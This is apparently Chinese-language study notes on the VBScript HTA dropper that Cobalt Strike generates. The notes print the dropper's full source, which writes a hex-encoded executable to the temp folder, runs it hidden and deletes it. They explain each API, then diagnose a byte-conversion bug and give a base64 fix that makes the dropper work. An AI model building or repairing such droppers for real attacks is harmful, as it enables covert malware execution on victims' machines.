## CS生成HTA 
CobaltStrike 生成 hta execute 的 evil.hta ，源码如下： 
```vbscript
<script language="VBScript">
 Function var_func()
 var_shellcode = "4d5a90000300"
 Dim var_obj
 Set var_obj = CreateObject("Scripting.FileSystemObject")
 Dim var_stream
 Dim var_tempdir
 Dim var_tempexe
 Dim var_basedir
 Set var_tempdir = var_obj.GetSpecialFolder(2)
 var_basedir = var_tempdir & "\" & var_obj.GetTempName()
 var_obj.CreateFolder(var_basedir)
 var_tempexe = var_basedir & "\" & "evil.exe"
 Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
 For i = 1 to Len(var_shellcode) Step 2
 var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
 Next
 var_stream.Close
 Dim var_shell
 Set var_shell = CreateObject("Wscript.Shell")
 var_shell.run var_tempexe, 0, true
 var_obj.DeleteFile(var_tempexe)
 var_obj.DeleteFolder(var_basedir)
 End Function
 var_func
 self.close
 </script>
```
## 源码解析 
var_shellcode：可执行程序十六进制值
## CreateObject
CreateObject：创建指定类型的对象
CreateObject(servername.typename[,location]) 
servername 必需的。提供对象的应用程序的名称 
typename 必需的。对象的类型/类
location  可选的。在何处创建对象
## FileSystemObject 
文件系统对象,提供对计算机文件系统的访问
https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/filesystemobject-object
### 对象方法：
GetSpecialFolder：返回某些 Windows 特殊文件夹的路径。 GetSpecialFolder(2)：返回tmp临时文件夹路径 GetTempName：返回随机生成的临时文件或文件夹。 CreateFolder：创建新文件夹。 CreateTextFile：创建一个文本文件并返回一个可用于读取或写入文件的 TextStream 对象。 DeleteFile：删除一个或多个指定文件。 DeleteFolder：删除一个或多个指定的文件夹。 CreateTextFile https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/create textfile-method 说明：创建指定的文件名并返回可用于读取或写入文件的TextStream对象。 语法：object.CreateTextFile (filename, [ overwrite, [ unicode ]]) object：必填。始终是文件系统对象或文件夹对象的名称。 filename：必填。标识要创建的文件的字符串表达式。 overwrite：自选。指示是否可以覆盖现有文件的布尔值。如果可以覆盖文件，则值为True;如果无法覆盖， 则为 false。如果省略，则可以覆盖现有文件。 unicode：自选。指示文件是创建为 Unicode 文件还是 ASCII 文件的布尔值。如果将文件创建为 Unicode 文件，则值为True;如果它是作为 ASCII 文件创建的，则为 False。如果省略，则假定为 ASCII 文件。 TextStream对象 https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/textstr eam-object wirte方法：将指定文本写入 TextStream 文件。 类型转换函数 https://learn.microsoft.com/en-us/dotnet/visual-basic/language-reference/keywords/conver sion-summary CLng：将一种数据类型转换为另一种数据类型。-2,147,483,648 至 2,147,483,647；分数是四舍五入 的。 Chr函数 将 ANSI 值转换为字符串。 https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/chr-fu nction 字符集 https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/charac ter-set-0127 https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/charac ter-set-128255 Mid函数 返回一个Variant（字符串），其中包含字符串中指定数量的字符 https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/mid-fu nction Wscript.Shell 提供对系统 Shell 方法的访问。 https://ss64.com/vb/run.html run方法：运行一个应用 https://ss64.com/vb/run.html 测试例子 存在的问题 这种方式生成的 evil.hta 执行后会生成一个 evil.exe 程序，然后执行，但是这种方式执行会报错。 问题原因在于 Chr(Clng("&H" & Mid(var_shellcode,i,2))) 通过 Clng 函数把十六进制值，转换为十进制后，使用 Chr 函数转为 十六进制值，无法转换为对应 ASCII 值后写入文件中，会出现 ASCII 码的值，当出现这种情况时，会用?表示无法转换的值，然后写 入文件中，而? 实际的十六进制值为3F，从而导致生成的程序出错。
## 解决方法
把 var_shellcode 复制到如下网站Input处，进行16进制解码和 base64 编码，替换 var_b64shellcode 的值 https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')To_Base64('A-Za-z0-9%2B/%3D')
![[Pasted image 20250124112023.png]]